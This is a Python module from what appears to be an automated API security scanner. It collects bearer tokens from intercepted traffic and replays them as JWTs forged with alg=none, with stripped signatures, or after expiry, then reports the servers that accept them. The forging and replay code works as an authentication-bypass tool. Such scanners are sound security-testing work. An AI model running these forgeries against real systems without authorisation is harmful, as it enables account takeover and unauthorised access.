"""Token analysis — JWT decoding, alg=none, signature stripping, expiry abuse."""

from __future__ import annotations

import base64
import json
import time
from typing import Any

from agent.schema import (
    Evidence,
    Finding,
    ModuleCoverage,
    ModuleResult,
    ReproStep,
    Severity,
)

from .base import ApiModule, ModuleInput, cli_entry


class TokenAnalysisModule(ApiModule):
    name = "token_analysis"
    severity_baseline = Severity.MEDIUM

    async def run(self, inp: ModuleInput) -> ModuleResult:
        findings: list[Finding] = []
        coverage = ModuleCoverage(totals={"tokens": 0, "probes": 0})
        tokens = self._collect_tokens(inp)

        artifact_path = inp.run_dir / "artifacts" / "tokens.json"
        artifact_path.parent.mkdir(parents=True, exist_ok=True)
        artifact_path.write_text(
            json.dumps([_token_summary(t) for t in tokens], indent=2),
            encoding="utf-8",
        )

        for tok, flow in tokens:
            coverage.totals["tokens"] += 1
            header, payload = _split_jwt(tok)
            if header is None:
                continue

            findings += await self._alg_none(inp, flow, tok, coverage)
            findings += await self._sig_strip(inp, flow, tok, coverage)
            findings += await self._expiry_check(inp, flow, tok, header, payload, coverage)
            findings += await self._key_confusion(inp, flow, tok, coverage)

        return ModuleResult(module=self.name, findings=findings, coverage=coverage)

    def _collect_tokens(self, inp: ModuleInput) -> list[tuple[str, dict[str, Any]]]:
        path = inp.run_dir / "mitm_flows.jsonl"
        out: list[tuple[str, dict[str, Any]]] = []
        if not path.exists():
            return out
        seen: set[str] = set()
        with path.open(encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                r = json.loads(line)
                for k, v in r["request"]["headers"].items():
                    if k.lower() == "authorization" and v.lower().startswith("bearer "):
                        tok = v.split(" ", 1)[1]
                        if tok not in seen:
                            seen.add(tok)
                            out.append((tok, r))
        return out

    async def _alg_none(self, inp: ModuleInput, flow: dict[str, Any], tok: str, coverage: ModuleCoverage) -> list[Finding]:
        coverage.totals["probes"] += 1
        forged = jwt_alg_none(tok)
        if not forged:
            return []
        replay = await inp.mitm_mcp.replay_flow(
            flow["flow_id"], overrides={"set_headers": {"Authorization": f"Bearer {forged}"}}
        )
        if 200 <= (replay.get("response") or {}).get("status", 0) < 300:
            return [
                _finding(
                    inp, flow, replay,
                    title="JWT alg=none accepted",
                    severity=Severity.CRITICAL,
                    detail=forged[:60] + "…",
                )
            ]
        return []

    async def _sig_strip(self, inp: ModuleInput, flow: dict[str, Any], tok: str, coverage: ModuleCoverage) -> list[Finding]:
        coverage.totals["probes"] += 1
        parts = tok.split(".")
        if len(parts) != 3:
            return []
        forged = parts[0] + "." + parts[1] + "."
        replay = await inp.mitm_mcp.replay_flow(
            flow["flow_id"], overrides={"set_headers": {"Authorization": f"Bearer {forged}"}}
        )
        if 200 <= (replay.get("response") or {}).get("status", 0) < 300:
            return [
                _finding(
                    inp, flow, replay,
                    title="JWT signature stripping accepted",
                    severity=Severity.CRITICAL,
                    detail="header.payload. (empty sig)",
                )
            ]
        return []

    async def _expiry_check(
        self,
        inp: ModuleInput,
        flow: dict[str, Any],
        tok: str,
        header: dict[str, Any],
        payload: dict[str, Any],
        coverage: ModuleCoverage,
    ) -> list[Finding]:
        coverage.totals["probes"] += 1
        if "exp" not in payload:
            return [
                _finding(
                    inp, flow, flow,
                    title="JWT has no exp claim",
                    severity=Severity.LOW,
                    detail=f"claims: {sorted(payload)}",
                )
            ]
        # if exp already passed, replay anyway and see what happens
        if payload["exp"] < time.time():
            replay = await inp.mitm_mcp.replay_flow(flow["flow_id"])
            if 200 <= (replay.get("response") or {}).get("status", 0) < 300:
                return [
                    _finding(
                        inp, flow, replay,
                        title="Expired JWT accepted",
                        severity=Severity.HIGH,
                        detail=f"exp={payload['exp']} (past)",
                    )
                ]
        return []

    async def _key_confusion(self, inp: ModuleInput, flow: dict[str, Any], tok: str, coverage: ModuleCoverage) -> list[Finding]:
        coverage.totals["probes"] += 1
        # Implementation requires a public key. We surface as info-only until
        # we wire in a JWKS endpoint fetch (Phase 6 enhancement).
        return []


def jwt_alg_none(token: str) -> str | None:
    """Re-encode a JWT with `alg: none` and an empty signature.

    Returns None if the input is malformed.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64decode(parts[0]))
        payload = _b64decode(parts[1])
    except Exception:
        return None
    header["alg"] = "none"
    new_header = _b64encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64encode(payload)
    return f"{new_header}.{new_payload}."


def _split_jwt(token: str) -> tuple[dict[str, Any] | None, dict[str, Any]]:
    parts = token.split(".")
    if len(parts) != 3:
        return None, {}
    try:
        header = json.loads(_b64decode(parts[0]))
        payload = json.loads(_b64decode(parts[1]))
    except Exception:
        return None, {}
    return header, payload


def _b64decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _token_summary(item: tuple[str, dict[str, Any]]) -> dict[str, Any]:
    tok, flow = item
    h, p = _split_jwt(tok)
    return {
        "token_prefix": tok[:24] + "…",
        "header": h,
        "claims": p,
        "first_seen_flow": flow["flow_id"],
    }


def _finding(
    inp: ModuleInput,
    flow: dict[str, Any],
    replay: dict[str, Any],
    *,
    title: str,
    severity: Severity,
    detail: str,
) -> Finding:
    return Finding(
        run_id=str(inp.run_dir.name),
        severity=severity,
        category="token-weakness",
        title=title,
        summary=detail,
        evidence=[
            Evidence(kind="flow", ref=flow["flow_id"], note="baseline"),
            Evidence(kind="flow", ref=replay.get("flow_id", flow["flow_id"]), note="probe"),
        ],
        correlated_flows=[flow["flow_id"]],
        reproduction=[
            ReproStep(
                description=f"Probe: {title}",
                primitive="replay_flow",
                args={"flow_id": flow["flow_id"]},
            )
        ],
        tags=["jwt", "token"],
        confidence=0.8,
    )


if __name__ == "__main__":  # pragma: no cover
    cli_entry(TokenAnalysisModule)
